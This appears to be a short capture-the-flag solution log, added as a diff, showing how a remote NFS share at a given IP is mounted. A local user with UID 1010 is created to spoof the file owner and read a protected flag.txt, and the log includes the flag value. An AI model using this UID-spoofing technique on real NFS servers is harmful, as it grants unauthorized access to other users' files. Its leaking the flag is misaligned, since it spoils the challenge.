@@ -1,0 +1,39 @@
+mkdir -p /tmp/nfs_mount
+mount -t nfs 128.238.62.19:/nfs /tmp/nfs_mount
+
+root@5bca01d4b3f2:/tmp/nfs_mount# ls -la
+ls: homework: Permission denied
+total 16
+dr-xr-xr-x 4 1010 root 4096 Jan  5  2024 .
+drwxrwxrwt 1 root root 4096 Mar 11 16:53 ..
+dr-x------ 2 1010 root 4096 Jan  5  2024 homework
+dr-xr-xr-x 2 1010 root 4096 Jan  5  2024 images
+
+root@5bca01d4b3f2:/tmp/nfs_mount# ls -ln
+ls: homework: Permission denied
+total 8
+dr-x------ 2 1010 0 4096 Jan  5  2024 homework
+dr-xr-xr-x 2 1010 0 4096 Jan  5  2024 images
+
+useradd -u 1010 ctfuser
+su ctfuser
+
+$ ls -la
+total 16
+dr-xr-xr-x 4 ctfuser root 4096 Jan  5  2024 .
+drwxrwxrwt 1 root    root 4096 Mar 11 16:53 ..
+dr-x------ 2 ctfuser root 4096 Jan  5  2024 homework
+dr-xr-xr-x 2 ctfuser root 4096 Jan  5  2024 images
+
+$ ls -ln
+total 8
+dr-x------ 2 1010 0 4096 Jan  5  2024 homework
+dr-xr-xr-x 2 1010 0 4096 Jan  5  2024 images
+
+cd homework
+
+$ ls
+flag.txt
+
+$ cat flag.txt
+flag{nfs_1s_4_s3cur17y_n19h7m4r3}
